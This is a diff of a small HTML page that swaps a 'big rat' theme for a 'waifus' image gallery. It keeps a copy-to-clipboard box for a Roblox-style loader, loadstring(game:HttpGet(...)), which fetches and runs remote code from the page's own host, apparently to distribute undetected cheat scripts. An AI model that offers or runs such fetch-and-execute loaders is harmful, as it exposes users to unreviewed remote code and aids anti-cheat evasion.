@@ -3,82 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>big rat</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>waifus</title>
     <style>
         body { 
             background-color: #ffffff; 
-            font-family: "Arial", sans-serif; 
+            font-family: "Times New Roman", serif; 
             color: #000000; 
             margin: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding-top: 50px;
+            padding: 50px 20px;
         }
 
-        .big-rat {
-            width: 600px; /* Enormous */
-            max-width: 90vw;
-            height: auto;
-            margin-bottom: 20px;
+        h1 {
+            font-size: 60px;
+            margin-bottom: 30px;
+            letter-spacing: -2px;
         }
 
-        .copy-container {
+        .image-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            align-items: center;
+            width: 100%;
+        }
+
+        .enormous-waifu {
+            width: 800px; /* Massive size */
+            max-width: 95vw;
+            border: 1px solid #eee;
+            box-shadow: 5px 5px 0px #f0f0f0;
+        }
+
+        .controls {
+            margin-top: 50px;
             text-align: center;
             width: 100%;
-            max-width: 600px;
+            max-width: 800px;
+            background: #fdfdfd;
+            padding: 30px;
+            border: 1px dashed #ccc;
         }
 
-        .script-display {
-            background: #f0f0f0;
-            border: 1px solid #ccc;
-            padding: 10px;
-            font-family: monospace;
+        .script-box {
+            background: #ffffff;
+            border: 1px solid #999;
+            padding: 15px;
+            font-family: "Courier New", monospace;
             font-size: 14px;
             word-break: break-all;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             display: block;
+            color: #333;
         }
 
-        .classic-button {
+        .classic-btn {
             background: #e1e1e1;
-            border: 1px solid #707070;
-            padding: 8px 24px;
-            font-size: 16px;
+            border-top: 2px solid #fff;
+            border-left: 2px solid #fff;
+            border-right: 2px solid #7b7b7b;
+            border-bottom: 2px solid #7b7b7b;
+            padding: 10px 30px;
+            font-size: 18px;
             cursor: pointer;
-            color: black;
+            font-family: Arial, sans-serif;
         }
 
-        .classic-button:hover {
-            background: #d5d5d5;
-            border-color: #000;
-        }
-
-        .classic-button:active {
-            background: #afafaf;
+        .classic-btn:active {
+            border-top: 2px solid #7b7b7b;
+            border-left: 2px solid #7b7b7b;
+            border-right: 2px solid #fff;
+            border-bottom: 2px solid #fff;
         }
 
         .discord-link {
-            margin-top: 40px;
-            color: blue;
+            margin-top: 50px;
+            color: #0000ff;
+            font-size: 16px;
             text-decoration: underline;
-            font-size: 14px;
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
         }
     </style>
 </head>
 <body>
 
-    <h1 style="font-size: 48px; font-weight: bold; margin-bottom: 10px;">big rat</h1>
+    <h1>waifus</h1>
 
-    <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji/assets/svg/1f400.svg" class="big-rat" alt="RAT">
+    <div class="image-container">
+        <img src="https://i.pinimg.com/736x/ee/b9/17/eeb91712d01f7e78e546a5dc562e0e69.jpg" class="enormous-waifu">
+        <img src="https://i.pinimg.com/736x/57/bf/d8/57bfd8bd126b3fd29fe60707d2ce73ef.jpg" class="enormous-waifu">
+        <img src="https://i.pinimg.com/736x/48/0f/11/480f11c563cebaa31b063991e2509b00.jpg" class="enormous-waifu">
+    </div>
 
-    <div class="copy-container">
-        <code class="script-display" id="script-path">
+    <div class="controls">
+        <code class="script-box" id="loader-text">
             loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()
         </code>
         
-        <button class="classic-button" onclick="copyScript()">
+        <button class="classic-btn" onclick="copyLoader()">
             Copy Script
         </button>
     </div>
@@ -87,15 +116,16 @@
         discord server
     </a>
 
-    <script>
-        // Update URL to match current host automatically
-        const currentUrl = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
-        document.getElementById('script-path').innerText = currentUrl;
+    <p class="footer-text">powered by big rat technology</p>
 
-        function copyScript() {
-            const text = document.getElementById('script-path').innerText;
+    <script>
+        // Set actual URL based on current host
+        document.getElementById('loader-text').innerText = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
+
+        function copyLoader() {
+            const text = document.getElementById('loader-text').innerText;
             navigator.clipboard.writeText(text);
-            alert("copied");
+            alert("copied to clipboard");
         }
     </script>
 
